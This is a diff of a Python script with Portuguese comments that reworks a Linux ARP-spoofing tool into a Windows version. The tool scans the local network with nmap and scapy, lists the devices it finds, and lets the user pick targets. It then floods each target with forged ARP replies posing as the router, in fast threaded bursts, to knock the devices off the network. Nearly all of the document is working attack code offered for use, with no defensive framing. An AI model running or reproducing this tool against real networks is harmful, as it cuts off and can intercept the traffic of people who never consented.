@@ -1,204 +1,158 @@
-import subprocess
-import re
 import time
-import requests
+import psutil
+import subprocess
+from scapy.all import ARP, Ether, srp, sendp, conf
+import nmap
 import threading
 import os
-from queue import Queue
-from scapy.all import ARP, Ether, sendp, srp, conf, get_if_list
 
-# Função para limpar a tela
-os.system('clear') 
+os.system('cls')
 
-# Exibir o banner com lolcat
-def display_banner():
-    banner = """
- _     _  ___   _______  ___     _______  __   __  _______ 
-| | _ | ||   | |       ||   |   |       ||  | |  ||       |
-| || || ||   | |    ___||   |   |   _   ||  | |  ||_     _|
-|       ||   | |   |___ |   |   |  | |  ||  |_|  |  |   |  
-|       ||   | |    ___||   |   |  |_|  ||       |  |   |  
-|   _   ||   | |   |    |   |   |       ||       |  |   |  
-|__| |__||___| |___|    |___|   |_______||_______|  |___|  
-by: @MS40GG    """
+# Código ANSI para verde
+GREEN = "\033[92m"
+RESET = "\033[0m"
 
-    
-    subprocess.run(["echo", banner], stdout=subprocess.PIPE, text=True)
-    subprocess.run(["lolcat"], input=banner, text=True)
+banner = """
+           _  __ _               _    __          _______ _   _ _____   ______          _______ 
+          (_)/ _(_)             | |   \ \        / /_   _| \ | |  __ \ / __ \ \        / / ____|
+ __      ___| |_ _    ___  _   _| |_   \ \  /\  / /  | | |  \| | |  | | |  | \ \  /\  / / (___  
+ \ \ /\ / / |  _| |  / _ \| | | | __|   \ \/  \/ /   | | | . ` | |  | | |  | |\ \/  \/ / \___ \ 
+  \ V  V /| | | | | | (_) | |_| | |_     \  /\  /   _| |_| |\  | |__| | |__| | \  /\  /  ____) |
+   \_/\_/ |_|_| |_|  \___/ \__,_|\__|     \/  \/   |_____|_| \_|_____/ \____/   \/  \/  |_____/ 
+                                                                                                
+                                                                                                
+"""
 
-
-# Selecionar interface de rede
-def select_network_interface():
-    interfaces = get_if_list()
-    print(" ")
-    print(" ")
-    print("Placas de rede disponíveis:")
-    for index, interface in enumerate(interfaces):
-        print(f"{index + 1}. {interface}")
-    choice = int(input("Selecione a placa de rede (número): ")) - 1
-    if 0 <= choice < len(interfaces):
-        selected_interface = interfaces[choice]
-        conf.iface = selected_interface
-        print(f"Placa de rede selecionada: {selected_interface}")
-        return selected_interface
-    else:
-        print("Seleção inválida. Saindo...")
-        exit()
+# Exibe o banner em verde
+print(GREEN + banner + RESET)
 
 
-# Identificar o IP do roteador
-def get_router_ip():
-    try:
-        print("Obtendo o IP do roteador automaticamente...")
-        gateway = conf.route.route("0.0.0.0")[2]
-        print(f"IP do roteador identificado: {gateway}")
-        return gateway
-    except Exception as e:
-        print(f"Erro ao identificar o IP do roteador: {e}")
-        return "192.168.0.1"  # Retorno padrão
 
+def detect_default_interface():
+    """
+    Detecta a interface de rede padrão no Windows.
+    """
+    interfaces = psutil.net_if_addrs()
+    for iface_name, iface_addresses in interfaces.items():
+        for addr in iface_addresses:
+            if addr.family == psutil.AF_LINK:  # Identifica uma interface de rede
+                if "Wi-Fi" in iface_name or "Wireless" in iface_name or "wlan" in iface_name.lower():
+                    return iface_name
+    return None
 
-# Escanear a rede com Nmap
-def scan_with_nmap(target_ip_range):
+def scan_network_with_nmap(target_ip_range):
+    """
+    Escaneia a rede usando Nmap.
+    """
     print("Escaneando a rede com Nmap, por favor aguarde...")
-    result = subprocess.run(
-        ["nmap", "-sP", target_ip_range],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        text=True
-    )
-    output = result.stdout
-
+    nm = nmap.PortScanner()
+    nm.scan(hosts=target_ip_range, arguments='-sn')  # Escaneia apenas para hosts (não portas)
+    
     devices = []
-    for line in output.split("\n"):
-        if "Nmap scan report for" in line:
-            ip = line.split()[-1]
-            devices.append({'ip': ip, 'mac': None, 'vendor': None})
-        elif "MAC Address" in line:
-            mac = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", line).group(0)
-            if devices:
-                devices[-1]['mac'] = mac
-
+    for host in nm.all_hosts():
+        if 'hostnames' in nm[host]:
+            devices.append({'ip': host, 'mac': nm[host].get('addresses', {}).get('mac', 'Desconhecido')})
+        else:
+            devices.append({'ip': host, 'mac': 'Desconhecido'})
     return devices
 
-
-# Escanear a rede com Scapy
-def scan_with_scapy(target_ip_range):
-    print("Escaneando a rede com ARP (Scapy)...")
+def scan_network_with_arp(target_ip_range, interface):
+    """
+    Escaneia a rede usando ARP para encontrar dispositivos conectados.
+    """
+    print("Escaneando a rede com ARP, por favor aguarde...")
     arp_request = ARP(pdst=target_ip_range)
     broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
-    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
+    answered_list = srp(arp_request_broadcast, iface=interface, timeout=2, verbose=False)[0]
 
     devices = []
     for element in answered_list:
-        devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc, 'vendor': None})
+        devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
     return devices
 
+def arp_spoof(target_ip, target_mac, router_ip, interface):
+    """
+    Realiza ataque ARP Spoofing contra o dispositivo alvo.
+    """
+    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
+    packet = Ether(dst=target_mac) / arp_response
 
-# Identificar o fabricante do MAC usando threads
-def get_mac_vendor_threaded(mac_addresses):
-    def fetch_vendor(mac, result_queue):
-        try:
-            response = requests.get(f"https://api.macvendors.com/{mac}", timeout=2)
-            if response.status_code == 200:
-                result_queue.put((mac, response.text.strip()))
-            else:
-                result_queue.put((mac, "Fabricante desconhecido"))
-        except Exception:
-            result_queue.put((mac, "Erro ao consultar MAC"))
+    print(f"Iniciando ataque ARP Spoofing contra {target_ip} ({target_mac})...")
+    try:
+        while True:
+            sendp(packet, iface=interface, verbose=False, count=50)  # Aumenta a quantidade de pacotes por vez
+            time.sleep(0.05)  # Reduz o intervalo entre pacotes para 50ms
+    except KeyboardInterrupt:
+        print("\nAtaque ARP interrompido.")
 
-    result_queue = Queue()
+def attack_device(device, router_ip, interface):
+    """
+    Função que realiza o ataque ARP para um dispositivo específico.
+    """
+    print(f"Iniciando ataque ARP contra {device['ip']} ({device['mac']})...")
+    arp_spoof(device['ip'], device['mac'], router_ip, interface)
+
+def attack_multiple_devices(devices_to_attack, router_ip, interface):
+    """
+    Inicia o ataque ARP Spoofing para múltiplos dispositivos simultaneamente.
+    """
     threads = []
-
-    for mac in mac_addresses:
-        thread = threading.Thread(target=fetch_vendor, args=(mac, result_queue))
-        thread.start()
+    
+    # Criar uma thread para cada dispositivo a ser atacado
+    for device in devices_to_attack:
+        thread = threading.Thread(target=attack_device, args=(device, router_ip, interface))
         threads.append(thread)
+        thread.start()
 
+    # Aguardar o término de todas as threads
     for thread in threads:
         thread.join()
 
-    vendor_mapping = {}
-    while not result_queue.empty():
-        mac, vendor = result_queue.get()
-        vendor_mapping[mac] = vendor
-
-    return vendor_mapping
-
-
-# Mesclar resultados de Nmap e Scapy
-def merge_results(nmap_devices, scapy_devices):
-    devices = {device['ip']: device for device in nmap_devices}
-
-    for scapy_device in scapy_devices:
-        if scapy_device['ip'] not in devices:
-            devices[scapy_device['ip']] = scapy_device
-        elif not devices[scapy_device['ip']]['mac']:
-            devices[scapy_device['ip']]['mac'] = scapy_device['mac']
-
-    return list(devices.values())
-
-
-# Desconectar dispositivos com ARP Spoofing
-def disconnect_devices(devices, router_ip):
-    packets = []
-    for device in devices:
-        arp_response = ARP(op=2, pdst=device['ip'], hwdst=device['mac'], psrc=router_ip)
-        ether = Ether(dst=device['mac'])
-        packet = ether / arp_response
-        packets.append(packet)
-
-    print("\nIniciando ataque ARP nos dispositivos selecionados...")
-    try:
-        while True:
-            for packet in packets:
-                sendp(packet, verbose=False)
-            time.sleep(0.5)
-    except KeyboardInterrupt:
-        print("\nAtaque ARP interrompido pelo usuário.")
-
-
 if __name__ == "__main__":
-    # Exibir o banner
-    display_banner()
+    # Detecta a interface padrão
+    interface = detect_default_interface()
+    if not interface:
+        print("Não foi possível detectar uma interface Wi-Fi automaticamente. Certifique-se de que há uma interface ativa.")
+        exit()
 
-    # Selecionar placa de rede
-    selected_interface = select_network_interface()
+    print(f"Interface detectada: {interface}")
 
-    # Identificar o IP do roteador e o intervalo de IPs
-    router_ip = get_router_ip()
-    base_ip = ".".join(router_ip.split(".")[:3])
-    target_ip_range = f"{base_ip}.1/24"
+    # Configuração da rede
+    target_ip_range = "192.168.0.1/24"  # Ajuste conforme necessário
+    router_ip = "192.168.0.1"  # IP do roteador, ajuste se necessário
 
-    # Realizar varreduras
-    nmap_devices = scan_with_nmap(target_ip_range)
-    scapy_devices = scan_with_scapy(target_ip_range)
+    # Escaneia a rede usando Nmap e ARP
+    devices_nmap = scan_network_with_nmap(target_ip_range)
+    devices_arp = scan_network_with_arp(target_ip_range, interface)
 
-    # Combinar os resultados
-    combined_devices = merge_results(nmap_devices, scapy_devices)
+    # Combina os resultados para garantir que nenhum dispositivo seja perdido
+    all_devices = {device['ip']: device for device in devices_nmap + devices_arp}
+    all_devices = list(all_devices.values())
 
-    # Identificar fabricantes
-    mac_addresses = [device['mac'] for device in combined_devices if device['mac']]
-    vendor_mapping = get_mac_vendor_threaded(mac_addresses)
-    for device in combined_devices:
-        if device['mac']:
-            device['vendor'] = vendor_mapping.get(device['mac'], "Fabricante desconhecido")
-
-    # Exibir dispositivos encontrados
     print("\nDispositivos encontrados na rede:")
-    for index, device in enumerate(combined_devices):
-        mac = device['mac'] if device['mac'] else "MAC não encontrado"
-        vendor = device['vendor'] if device['vendor'] else "Fabricante desconhecido"
-        print(f"{index + 1}. IP: {device['ip']}, MAC: {mac}, Fabricante: {vendor}")
+    for index, device in enumerate(all_devices):
+        print(f"{index + 1}. IP: {device['ip']}, MAC: {device['mac']}")
 
-    # Solicitar dispositivos para desconectar
-    print("\nDigite os números dos dispositivos que deseja desconectar (separados por vírgula):")
-    selected_indexes = input("Seleção: ").split(",")
-    selected_devices = [combined_devices[int(index) - 1] for index in selected_indexes if index.isdigit()]
+    # Seleção de múltiplos dispositivos para ataque
+    selected_devices = input("\nSelecione os dispositivos para atacar (exemplo: 1,3,5): ")
+    selected_devices = selected_devices.split(',')
 
-    if selected_devices:
-        disconnect_devices(selected_devices, router_ip)
-    else:
-        print("Nenhum dispositivo válido foi selecionado.")
+    devices_to_attack = []
+    for index in selected_devices:
+        try:
+            device_index = int(index.strip()) - 1
+            if device_index < 0 or device_index >= len(all_devices):
+                print(f"Dispositivo {index} não é válido. Pulando...")
+            else:
+                devices_to_attack.append(all_devices[device_index])
+        except ValueError:
+            print(f"{index} não é um número válido.")
 
+    if not devices_to_attack:
+        print("Nenhum dispositivo válido selecionado.")
+        exit()
+
+    # Inicia o ataque ARP Spoofing para todos os dispositivos selecionados simultaneamente
+    print("\nIniciando ataque ARP Spoofing nos dispositivos selecionados...")
+    attack_multiple_devices(devices_to_attack, router_ip, interface)
